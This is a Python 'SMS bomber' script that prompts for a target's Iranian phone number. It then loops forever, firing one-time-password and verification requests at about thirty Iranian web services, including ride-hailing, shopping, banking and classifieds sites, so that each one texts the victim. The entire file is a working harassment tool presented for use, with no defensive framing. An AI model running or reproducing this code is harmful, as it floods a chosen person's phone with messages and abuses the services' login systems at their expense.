from colorama import init, Fore
import platform
import subprocess
import getpass
from os import system, name
import requests
import time

init()




phone =''
x = 0



def logo_linux(): 
    global phone
    pm = f'''

\t██   ██    ███████  █████  ██████  ██████   █████  ██      ██       █████  ██   ██ 
\t██   ██    ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██      ██   ██ ██   ██ 
\t███████    ███████ ███████ ██████  ██████  ███████ ██      ██      ███████ ███████ 
\t██   ██         ██ ██   ██ ██   ██ ██   ██ ██   ██ ██      ██      ██   ██ ██   ██ 
\t██   ██ ██ ███████ ██   ██ ██   ██ ██   ██ ██   ██ ███████ ███████ ██   ██ ██   ██ 
\t                           {Fore.WHITE}--Coded by A.Vaziri--                                                                                
                                                                                   
'''
    print(Fore.RED+pm)
    for i in range(0 , 3):
        print()
        time.sleep(0.1)
    name = platform.uname()[0]
    username = getpass.getuser()
    cpu = subprocess.getoutput("wmic cpu get name").replace("Name", "").replace("\n", "").replace(" ", "")
    More = platform.uname()[2]
    print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Info:')
    print(f'\tName: --{name}')
    print(f'\tUsername: {username}')
    print(f'\tCpu {cpu}')
    print(f'\tMore: {More}\n----------------------------------------------------------------\n')
    for i in range(0 , 6):
        print()
        time.sleep(0.1)
   
    
    phone = input(f'{username}@Home~sms_bomb\n-->$')
    f = '0' + phone.split('98')[1]
    snap = {'cellphone': phone}
    digi = {'cellNumber': f,
            "device": {
                'deviceId': "a16e6255-17c3-431b-b047-3f66d24c286f", 
                'deviceModel': 'WEB_BROWSER',
                'deviceAPI': 'WEB_BROWSER',
                'osName': 'WEB'
                }}
    snap2 = {'phone': f}
    tapsi = {'credential': {'phoneNumber':f, "role": "PASSENGER"}}
    divar = {'phone': f}
    emd = "send=1&cellphone="+f
    rub = {"api_version":"3","method":"sendCode","data":{"phone_number":phone,"send_type":"SMS"}}
    bamad = "cellNumber="+f 
    ali = {"phoneNumber": f }
    hamrah = {"action":"getAppViaSMS","number": f } 
    arkd = {"mobile":f,"country_code":"IR","provider_code":"RUBIKA"} 
    tap33 = {'credential': {
        'phoneNumber': f}, 'role': "PASSENGER"}
    balad = {'phone_number': f}
    ostad = {'mobile': f}
    cyclops = {'source': "besina","mibile": f}
    bit24 = {"mobile": f, "contry_code": "98"}
    doctoreto = {'mobile': f, "captcha": "", "country_id": 205}
    react_okala = {'mobile': f, 'deviceTypeCode': 0, 'confirmTerms': True, 'noyRobot': False}
    beroozmart = {'mobile': f, "sendViasms": True, 'email': 'null', 'sendViaEmail': False}
    football360 = {'phone_number': phone}
    messengerg2c4 = {'se':f}
    snapfood = {'cellphone': f}

def logo_os():
    global phone
    pm = f'''
\t██╗  ██╗   ███████╗ █████╗ ██████╗ ██████╗  █████╗ ██╗     ██╗      █████╗ ██╗  ██╗
\t██║  ██║   ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║     ██║     ██╔══██╗██║  ██║
\t███████║   ███████╗███████║██████╔╝██████╔╝███████║██║     ██║     ███████║███████║
\t██╔══██║   ╚════██║██╔══██║██╔══██╗██╔══██╗██╔══██║██║     ██║     ██╔══██║██╔══██║
\t██║  ██║██╗███████║██║  ██║██║  ██║██║  ██║██║  ██║███████╗███████╗██║  ██║██║  ██║
\t╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
\t                           {Fore.WHITE}==> Coded by A.Vaziri <==                                                        
    '''
    print(Fore.RED+pm)
    for i in range(0 , 3):
        print()
        time.sleep(0.1)
    name = platform.uname()[0]
    username = getpass.getuser()
    cpu = subprocess.getoutput("wmic cpu get name").replace("Name", "").replace("\n", "").replace(" ", "")
    More = platform.uname()[2]
    print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Info:')
    print(f'\tName: Windows(os)--{name}')
    print(f'\tUsername: {username}')
    print(f'\tCpu {cpu}')
    print(f'\tMore: {More}\n-----------------------------------------------------------\n')
    for i in range(0 , 6):
        print()
        time.sleep(0.1)
    print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Please Enter numberPhone target(EX:+98**********)!')
    ph = f'{name}:\{username}\sms_bomb>'
    phone = input(ph)
    f = '0' + phone.split('98')[1]
    snap = {'cellphone': phone}
    digi = {'cellNumber': f,
            "device": {
                'deviceId': "a16e6255-17c3-431b-b047-3f66d24c286f", 
                'deviceModel': 'WEB_BROWSER',
                'deviceAPI': 'WEB_BROWSER',
                'osName': 'WEB'
                }}
    snap2 = {'phone': f}
    tapsi = {'credential': {'phoneNumber':f, "role": "PASSENGER"}}
    divar = {'phone': f}
    emd = "send=1&cellphone="+f
    rub = {"api_version":"3","method":"sendCode","data":{"phone_number":phone,"send_type":"SMS"}}
    bamad = "cellNumber="+f 
    ali = {"phoneNumber": f }
    hamrah = {"action":"getAppViaSMS","number": f } 
    arkd = {"mobile":f,"country_code":"IR","provider_code":"RUBIKA"} 
    tap33 = {'credential': {
        'phoneNumber': f}, 'role': "PASSENGER"}
    balad = {'phone_number': f}
    ostad = {'mobile': f}
    cyclops = {'source': "besina","mibile": f}
    bit24 = {"mobile": f, "contry_code": "98"}
    doctoreto = {'mobile': f, "captcha": "", "country_id": 205}
    react_okala = {'mobile': f, 'deviceTypeCode': 0, 'confirmTerms': True, 'noyRobot': False}
    beroozmart = {'mobile': f, "sendViasms": True, 'email': 'null', 'sendViaEmail': False}
    football360 = {'phone_number': phone}
    messengerg2c4 = {'se':f}
    snapfood = {'cellphone': f}

def main():
    global x
    f = '0' + phone.split('98')[1]
    snap = {'cellphone': phone}
    digi = {'cellNumber': f,
            "device": {
                'deviceId': "a16e6255-17c3-431b-b047-3f66d24c286f", 
                'deviceModel': 'WEB_BROWSER',
                'deviceAPI': 'WEB_BROWSER',
                'osName': 'WEB'
                }}
    snap2 = {'phone': f}
    tapsi = {'credential': {'phoneNumber':f, "role": "PASSENGER"}}
    divar = {'phone': f}
    emd = "send=1&cellphone="+f
    rub = {"api_version":"3","method":"sendCode","data":{"phone_number":phone,"send_type":"SMS"}}
    bamad = "cellNumber="+f 
    ali = {"phoneNumber": f }
    hamrah = {"action":"getAppViaSMS","number": f } 
    arkd = {"mobile":f,"country_code":"IR","provider_code":"RUBIKA"} 
    tap33 = {'credential': {
        'phoneNumber': f}, 'role': "PASSENGER"}
    balad = {'phone_number': f}
    ostad = {'mobile': f}
    cyclops = {'source': "besina","mibile": f}
    bit24 = {"mobile": f, "contry_code": "98"}
    doctoreto = {'mobile': f, "captcha": "", "country_id": 205}
    react_okala = {'mobile': f, 'deviceTypeCode': 0, 'confirmTerms': True, 'noyRobot': False}
    beroozmart = {'mobile': f, "sendViasms": True, 'email': 'null', 'sendViaEmail': False}
    football360 = {'phone_number': phone}
    messengerg2c4 = {'se':f}
    snapfood = {'cellphone': f}
    while True:
        x += 1
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms1...')
        try: 
            requests.post('https://www.hamrah-mechanic.com/api/v1/membership/otp', json= hamrah)
        except IOError:
            print(Fore.RED+'Error sms1')
            
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms2...')
        time.sleep(0.1)
        try: 
            requests.post("https://football360.ir/api/auth/verify-phone/", json= football360)
        except IOError:
            print(Fore.RED+'Error sms2')
            
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms3...')
        time.sleep(0.1)
        try: 
            requests.post('https://api.beroozmart.com/api/pub/account/send-otp', json= beroozmart)
        except IOError:
            print(Fore.RED+'Error sms3')
            
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms4...')
        time.sleep(0.1)
        try: 
            requests.post('https://mobapi.banimode.com/api/v2/auth/requests', json= f)
        except IOError:
            print(Fore.RED+'Error sms4')
            
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms5...')
        time.sleep(0.1)
        try: 
            requests.post('https://api-react.okala.com/C/CustomerAccount/OTPRegister', json= react_okala)
        except IOError:
            print(Fore.RED+'Error sms5')
            
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms6...')
        time.sleep(0.1)
        try: 
            requests.get("https://api.doctoreto.com/api/web/patient/v1/accounts/register", json= doctoreto)
        except IOError:
            print(Fore.RED+'Error sms6')
            
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms7...')
        time.sleep(0.1)
        try: 
            requests.post('https://drdr.ir/api/v3/auth/login/mobile/init', json= f)
        except IOError:
            print(Fore.RED+'Error sms7')
            
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms8...')
        time.sleep(0.1)
        try:
            requests.post('https://bit24.cash/auth/bit24/api/v3/auth/chech-mobile', json= bit24)
        except IOError:
            print(Fore.GREEN+"Error sms8")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms9...')
        time.sleep(0.1)
        try:
            requests.post("https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", json= {"phone": f})
        except IOError:
            print(Fore.GREEN+"Error sms9")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms10...')
        time.sleep(0.1)
        try:
            requests.post('https://cyclops.drnext.ir/v1/patients/auth/send-verification-token', json= cyclops)
        except IOError:
            print(Fore.GREEN+"Error sms10")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms11...')
        time.sleep(0.1)
        try:
            requests.post("https://api.ostadkr.com/login", json= ostad)
        except IOError:
            print(Fore.GREEN+"Error sms11")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms12...')
        time.sleep(0.1)
        try:
            requests.post(f'https://miare.ir/p/restaurant/#login?phone={f}')
        except IOError:
            print(Fore.GREEN+"Error sms12")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms13...')
        time.sleep(0.1)
        try:
            requests.post('https://account.api.balad.ir/api/web/auth/login/',json=balad)
        except IOError:
            print(Fore.GREEN+"Error sms13")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms14...')
        time.sleep(0.1)
        try:
            requests.post('https://tap33.me/api/v2/user', json=tap33)
        except IOError:
            print(Fore.GREEN+"Error sms14")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms15...')
        time.sleep(0.1)
        try:
            requests.post("https://app.mydigipay.com/digipay/api/users/send-sms",json=digi)
        except IOError:
            print(Fore.GREEN+"Error sms15")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms16...')
        time.sleep(0.1)
        try:
            requests.post("https://api.snapp.ir/api/v1/sms/link",json=snap2)
        except IOError:
            print(Fore.GREEN+"Error sms16")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms17...')
        time.sleep(0.1)
        try:
            requests.post("https://api.tapsi.cab/api/v2/user",json=tapsi)
        except IOError:
            print(Fore.GREEN+"Error sms17")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms18...')
        time.sleep(0.1)
        try:
            requests.post("https://api.divar.ir/v5/auth/authenticate",json=divar)
        except IOError:
            print(Fore.GREEN+"Error sms18")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms19...')
        time.sleep(0.1)
        try:
            requests.post("https://messengerg2c42.iranlms.ir/",json=rub)
        except IOError:
            print(Fore.GREEN+"Error sms19")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms20...')
        time.sleep(0.1)
        try:
            requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=snap)
        except IOError:
            print(Fore.GREEN+"Error sms20")
        
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms21...')
        time.sleep(0.1)
        try:
            requests.get("https://api.binjo.ir/api/panel/get_code/"+f)
        except IOError:
            print(Fore.RED+'Error sms21')
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms22...')
        time.sleep(0.1)
        try:
            requests.get(f"https://core.gap.im/v1/user/add.json?mobile={f}")
        except IOError:
            print(Fore.RED+'Error sms22')
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms23...')
        time.sleep(0.1)
        try:
            requests.post("https://web.emtiyaz.app/json/login",data=emd)
        except IOError:
            print(Fore.RED+'Error sms23')
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms24...')
        time.sleep(0.1)
        try:
            requests.get("https://api.torob.com/a/phone/send-pin/?phone_number="+f)
        except IOError:
            print(Fore.RED+'Error sms24')
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms25...')
        time.sleep(0.1)
        try:
            requests.post("https://bama.ir/signin-checkforcellnumber",data=bamad)
        except IOError:
            print(Fore.RED+'Error sms25')
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms26...')
        time.sleep(0.1)
        try:
            requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=ali)
        except IOError:
            print(Fore.RED+'Error sms26')
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms27...')
        time.sleep(0.1)
        try:
            requests.post("https://hamrahcard.ir/wp-admin/admin-ajax.php",data=hamrah)
        except IOError:
            print(Fore.RED+'Error sms27')
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms28...')
        time.sleep(0.1)
        try:
            requests.post("https://api.chartex.net/api/v2/user/validate",json=arkd)
        except IOError:
            print(Fore.RED+'Error sms28')
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms29...')
        time.sleep(0.1)
        try:
            requests.post('https://messengerg2c4.iranlms.ir/', json= messengerg2c4)
        except IOError:
            print(Fore.RED+'Error sms29')
        time.sleep(0.1)
        print(f'{Fore.YELLOW}[{Fore.RED}•{Fore.YELLOW}]', Fore.GREEN+'Waiting for sms29...')
        time.sleep(0.1)
        try:
            requests.post('https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa', json= snapfood)
        except IOError:
            print(Fore.RED+'Error sms30')
        time.sleep(0.1)
        print(Fore.WHITE+'start Mach ', x)
  
if name == 'nt':
    system('cls')
    logo_os()
    main()
    
else: 
    system('clear')
    logo_linux()
    main()   